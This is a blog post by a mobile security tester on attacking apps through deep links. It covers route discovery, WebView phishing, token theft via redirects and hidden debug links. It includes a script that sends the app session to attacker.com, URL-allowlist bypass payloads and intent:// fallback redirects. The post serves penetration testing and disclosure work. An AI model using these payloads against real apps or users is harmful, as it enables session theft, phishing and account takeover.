---
layout: post
title:  "Attacking mobile apps through deep links"
subtitle: "How I hunt for internal features, arbitrary web page opening and login token theft behind mobile apps' deep links"
date:   2022-01-23 10:00:00 +0100
author: "santoru"
visible: 1
tags: [Mobile security, Exploitation]
---

* table of contents
{:toc}

## Abstract
When I test a mobile application, deep links are one of the first things I
look at. They are an entry point into the app that anyone can reach, just by
making the victim tap a link, and they are usually written for marketing and
support, without anyone considering them a new attack surface.

In the last months I spent quite some time hunting deep links, and they kept
giving me the same kind of things: internal features, debug flags, sensitive
parameters and, my favourite ones, screens that open an arbitrary web page
inside the app and redirections that can be pointed anywhere. The first is a
perfect phishing vector, the second, in a login flow, hands you the victim's
token.

This blog post describes how I find them, how I test them and how I turn them
into something worth reporting.

## Deep links, App Links and Universal Links
A deep link is a link that opens a specific screen of an app instead of a web
page. Inside the app, a router reads the link, picks a screen and passes the
URL parameters to it. There are two kinds, and the difference matters a lot
for an attacker.

**Custom scheme deep links**, like `myapp://settings/notifications`. Nothing
to register and nothing to prove: the app just declares the scheme. On
Android it's an `intent-filter` in the manifest, on iOS an entry in
`CFBundleURLTypes` in the `Info.plist`. This also means that **any app can
declare the same scheme**. On Android, if both apps are installed, the user
gets a chooser to pick one; if only the attacker's app is installed, it opens
directly. On iOS there's no chooser and no rule: Apple's documentation just
says that which app opens is undefined. Some people reported that the app
installed first wins. Either way, whatever the link carries can end up in the
wrong app.

**Verified links**, like `https://myapp.com/product/42`. These are normal web
links, and the app has to prove it owns the domain:

- On Android they are called **App Links**. The `intent-filter` has
  `android:autoVerify="true"`, and the domain must serve
  `/.well-known/assetlinks.json` listing the package name and the SHA-256
  fingerprint of the app's signing certificate. Android downloads the file
  and verifies it. Without verification they are just "web links": before
  Android 12 they show the chooser, from Android 12 they open in the browser.
- On iOS they are called **Universal Links**. The app lists the domain in its
  `com.apple.developer.associated-domains` entitlement, and the domain must
  serve `/.well-known/apple-app-site-association` with the app ID (team ID
  plus bundle ID) and the paths the app handles.

From an attacker's point of view, all of this is great:

- **It's reachable from outside.** A link in an email, a QR code, a web page
  that redirects, or any other app on the device. On iOS another app can
  open any deep link with `UIApplication.shared.open(url)`; on Android it can
  do even more and start exported activities directly with an intent,
  including the ones that aren't `BROWSABLE`, and pass them extras.
- **It's big.** Every team adds its own links: marketing, support, growth,
  QA. Nobody has the full list, and nobody removes old ones.
- **Most of the time, the target screen trusts the parameters.** They go
  straight into screens that were written assuming they would only be opened
  by the app itself.

## Finding the links
No root or jailbreak needed for this part.

On **Android**, start from the `AndroidManifest.xml` (`apktool d app.apk`).
Every activity with an `intent-filter` containing the `BROWSABLE` category can
be opened from a link, and the filter tells you the scheme, the host and the
paths.

On **iOS**, custom schemes are in the `Info.plist` under `CFBundleURLTypes`,
and Universal Links are in the entitlements and in the
`apple-app-site-association` file of the domain.

But the manifest only tells you half of the story. The good stuff is the
router: open the decompiled app (`jadx` on Android) and search for the scheme
name. You will usually land on a big `switch` or a map of strings like
`"settings"`, `"webview"`, `"debug"`, `"internal"`. That's the real list, and
it's often much longer than what the app uses.

Once you have it, try every route:

```bash
# Android
adb shell am start -a android.intent.action.VIEW -d "myapp://webview?url=https://attacker.com"
# iOS simulator
xcrun simctl openurl booted "myapp://webview?url=https://attacker.com"
```

Then read the code of each screen to see which parameters it reads. Parameters
that the app never sends itself are the most interesting ones.

Finally, keep an eye on new releases: new links show up with almost every
update. To make this easier I added deep link diffing to the app comparison
of [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)
([#1740](https://github.com/MobSF/Mobile-Security-Framework-MobSF/pull/1740)):
give it two versions of the same APK and it shows which deep links were added
or removed, and which schemes, hosts and paths changed.

## Arbitrary web page opening
Many apps have a link like `myapp://webview?url=...` to show help pages,
terms and conditions or a promotion inside the app. First test: change `url`
to a server you control.

If the page loads, the next question is: what did the app give to my page?

1. **Check your server logs.** Some apps add the user's token as an
   `Authorization` header to every request made from the WebView, so their
   own pages are already logged in. If the token shows up in
   your logs, that's account takeover with a single tap.
2. **Look for JavaScript bridges.** On Android, search the code for
   `addJavascriptInterface` and `@JavascriptInterface`; on iOS for
   `WKScriptMessageHandler`. These are native functions exposed to the page:
   reading the session, opening screens, getting device information. They were
   written for the app's own pages, and now your page can call them:

   ```html
   <script>
     // name of the bridge and method taken from the decompiled app
     fetch("https://attacker.com/leak?d=" + encodeURIComponent(AppBridge.getSession()));
   </script>
   ```
3. **Phishing.** Even with no token and no bridge, you still have a page
   running inside the real app. See below.

### Phishing from inside the app
This one is often underrated, but think about it from the victim's side. They
tap a link and the target app opens: the real one, installed from the store,
with its icon in the task switcher. Inside it there's a screen saying the
session expired and asking for the password, or the PIN, or the card details
to "confirm" something.

This is particularly impactful for banking and finance apps: the PIN, the
card details or a one-time code to "confirm a payment" are exactly what an
attacker needs, and users are used to being asked for them inside the app.

Nothing in that screen tells the victim it's not the app:

- **There's no address bar.** A WebView shows no URL and no padlock, so
  there's nothing to check even for a careful user.
- **It looks native.** Copy the app's fonts, colours and layout into your
  page and it's indistinguishable from a real screen.
- **The trust is borrowed.** Users are trained to never type their password
  on a link from an email, but here they're not on a website, they're in the
  app. And if the link is an App Link or Universal Link, it's even a real
  `https://` link on the company's own domain.

For the report, a fake login inside the real app with the typed credentials
landing on your server is usually enough to show the impact.

### Bypassing the URL check
Most of the time there is a check on the URL, and most of the time it's a
string comparison. Try these against an allowed host like `target.com`:

```
https://attacker.com/?target.com           # contains("target.com")
https://target.com.attacker.com/           # startsWith("https://target.com")
https://attackertarget.com/                # endsWith("target.com")
https://target.com@attacker.com/           # userinfo: the host is attacker.com
https://attacker.com\@target.com/          # older Android Uri.parse and the WebView disagree on the backslash
javascript:alert(document.domain)//target.com  # contains(), and runs if JavaScript is enabled
```

If the check is done properly, look for an **open redirect on the allowed
domain**: `https://target.com/redirect?to=https://attacker.com` passes any
host allowlist, and the WebView follows the redirect, unless the app checks
every navigation and not just the first URL. Allowed domains are often big,
old websites, so there's usually one.

On Android there's one more trick, for checks that look at the host but not
at the scheme. Chrome on Android supports a special `intent://` scheme, made
so that web pages can open apps. Its format looks like this:

```
intent://HOST/PATH#Intent;scheme=SCHEME;package=PACKAGE;S.browser_fallback_url=URL;end
```

When Chrome opens it, it looks for an app matching `package`. If the app
isn't installed, it doesn't show an error: it navigates to
`browser_fallback_url` instead, which is there so that the page can send the
user to the store or to a website.

Now put `target.com` as the host and a package that doesn't exist:

```
intent://target.com/#Intent;package=com.does.not.exist;S.browser_fallback_url=https%3A%2F%2Fattacker.com;end
```

Parse this URL and the host is `target.com`, so a check like
`uri.host == "target.com"` passes. But when it reaches the browser, there's
no app called `com.does.not.exist`, so Chrome follows the fallback and the
victim lands on `attacker.com`. Put it in a redirect that only allows
`target.com`, and you have an open redirect again (note the `#` encoded as
`%23`, so that it stays inside the parameter):

```
https://target.com/redirect?to=intent://target.com/%23Intent;package=com.does.not.exist;S.browser_fallback_url=https%3A%2F%2Fattacker.com;end
```

Two things to keep in mind: it only works when the URL ends up in Chrome (or
in a Custom Tab), since a plain WebView doesn't understand `intent://` unless
the app handles it itself, and the fallback has to be an `http` or `https`
URL.

## Arbitrary redirection: stealing login tokens
Redirections are everywhere in login flows. The user logs in on a web page or
in the app, and at the end something has to send them back to where they
started, very often with a token attached:

```
https://login.target.com/auth?redirect_uri=myapp://login/callback
  → user logs in
  → myapp://login/callback?token=eyJhbGciOi...
```

The same happens with magic login links sent by email, with SSO between two
apps of the same company, and with deep links like
`myapp://login?next=/settings` that log the user in and then continue
somewhere else. If you control where the flow ends, you get the token.

What I try:

1. **Find the parameter.** Look at the login requests in Burp and at the login
   routes in the router, and search for names like `redirect`,
   `redirect_uri`, `next`, `return_to`, `continue` or `callback`.
2. **Point it at yourself.** Change it to `https://attacker.com/` and walk
   through the login. If the token lands in your logs, you're done.
3. **If it's checked, bypass it.** The same list as above works here:
   `contains`, `startsWith`, userinfo, backslash, and an open redirect on an
   allowed domain to bounce the token out.
4. **Try a custom scheme.** If the flow accepts any scheme, or ends on a
   custom scheme anyway, register the same scheme in your own app. On
   Android the victim gets a chooser that lists your app next to the real
   one; on iOS your app may or may not be the one that opens (see above).
   When yours is picked, the callback with the token goes to your app.

One thing to check before claiming account takeover: if the flow returns an
authorization code protected by PKCE, the stolen code is useless without the
verifier, which stays in the real app. In that case look for a token instead,
or for a flow that skips PKCE.

And remember that the victim only has to tap one link: if they're already
logged in on the web, many of these flows complete without asking anything,
and the token is gone before the page even renders.

## Internal features and debug flags
The router is shared by the whole company, so it often contains links that
were never meant for users: debug menus, feature flag screens, QA logins,
internal tools. They are hidden from the user interface, but a link opens
them just fine.

What to look for:

- **Environment switches.** A link that changes the backend URL of the app is
  the jackpot: all the next requests, including the user's token, go to your
  server.
- **Hidden parameters.** `debug=1`, `skip_confirmation=true`, `amount=`,
  `beta=true`: added for testing, never removed. Try them on every route, and
  grep the code for the parameter names each screen reads.
- **Actions without confirmation.** A link that changes a setting, adds a
  trusted device or confirms an operation as soon as it's opened is CSRF, but
  for mobile.
- **Path injection.** If a parameter ends up in an API path
  (`/api/cards/{id}`), try `../` in it: the app makes the request for you,
  with the victim's session.

## Delivering the link
A finding is only as good as its delivery. For the report, show how the victim
gets there:

- **A web page** that redirects to the deep link (`location.href =
  "myapp://..."`), sent by email or chat. Browsers may ask for confirmation
  or require a tap before opening an app, so a page with a big button
  linking to the deep link is the most reliable option.
- **A QR code**, for the same link.
- **A malicious app** on the device, which opens the deep link with no
  browser in the middle. On Android it can also start the activity directly
  with an intent and extras, with no prompt at all.

And always show the impact, not just the screen: the token in your logs, the
bridge call returning the session, the setting changed without a tap. "The app
opens my page" is a low; "the app sends me the session token" is a critical.

## Conclusions
Deep links are one of the best places to start when testing a mobile app: the
list is long, nobody owns it, and most of the time the target screens trust
the parameters they receive. Get the full list from the router, try every
route and every parameter, and diff every new release.
